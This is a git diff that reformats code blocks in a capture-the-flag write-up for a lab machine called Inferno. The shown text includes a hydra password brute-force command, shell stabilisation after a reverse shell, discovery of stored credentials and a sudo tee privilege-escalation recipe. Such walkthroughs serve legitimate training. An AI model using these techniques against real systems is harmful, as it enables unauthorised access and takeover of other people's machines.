@@ -85,7 +85,7 @@ durante
 ```
 Bruteforcing with hydra gives the following credentials:<br>
 <strong>hydra -L usernames.txt -P ~/rockyou.txt 10.10.X.X http-get /inferno/ -t 64</strong>
-```
+```bash
 [80][http-get] host: 10.10.X.X   login: admin   password: REDACTED
 ```
 Using the credentials leads to another login page:<br>
@@ -126,18 +126,18 @@ www-data@Inferno:/var/www/html/inferno/components/filemanager$
 
 From the shell we are <i>www-data</i>. Not a lot of permissions but we need to pivot to another user with more permissions.<br>
 NOTE: The shell kept getting closed for some reason. I didn't know what was actually wrong. Anyway I used screen to keep the reverse shell running even when the shell is closed
-```python
-$screen -S bash
-$python3 -c 'import pty;pty.spawn("/bin/bash")'
-$export TERM=xterm256-color
+```bash
+$ screen -S bash
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$ export TERM=xterm256-color
 ```
 Inside <i>/home/dante</i>, we see the first flag.<br>
-```
+```bash
 -rw-------  1 dante dante   33 Jan 11 15:22 local.txt
 ```
 But we dont have permission to read it.<br>
 Snooping around some more shows some files inside the downloads folder:
-```
+```bash
 drwxr-xr-x  2 root  root     4096 Jan 11 15:29 .
 drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
 -rw-r--r--  1 root  root     1511 Nov  3 11:52 .download.dat
@@ -162,7 +162,7 @@ drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
 -rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoXX.docx
 ```
 The <i>.download.dat</i> file looks rather interesting.
-```
+```bash
 www-data@Inferno:/home/dante/Downloads$ file .download.dat 
 .download.dat: ASCII text, with very long lines, with no line terminators
 ```
@@ -192,7 +192,7 @@ dante:REDACTED
 ```
 The line at the end are ssh credentials. <b>Great!</b>
 <br>
-```
+```bash
 dante@Inferno:/home/dante$ cat local.txt
 REDACTED
 ```
@@ -210,12 +210,12 @@ User dante may run the following commands on Inferno:
 ```
 Looks like <i>/usr/bin/tee</i>can be run by dante without a password.<br>
 Looking at gtfobins gives us the following <a href="https://gtfobins.github.io/gtfobins/tee/">exploit</a> for privilege escalation:
-```
+```bash
 LFILE=file_to_write
 echo DATA | sudo tee -a "$LFILE"
 ```
 This is really annoying me. I keep getting logged out by the system. Looking at the processes running I found the reason:
-```
+```bash
 -rw-r--r--  1 root root   1778 Dec  6 14:26 machine_services1320.sh
 ```
 This was the script that kept kicking me out. But I can't delete it cause it's owned by root.<br>
@@ -235,4 +235,4 @@ Second task Complete!
 
 # Conclusion
 
-This was my first writeup of anything. I hope it was good. This was a fun box. Although I got stuck at the apache login, I put thought into it and finall rooted the machine. If you have any doubts you can hit me up at @i-am-jezz. <b>Hack The Planet!</b>
+This was my first writeup of anything. I hope it was good. This was a fun box. Although I got stuck at the apache login, I put thought into it and finally rooted the machine. If you have any doubts you can hit me up at @i-am-jezz. <b>Hack The Planet!</b>
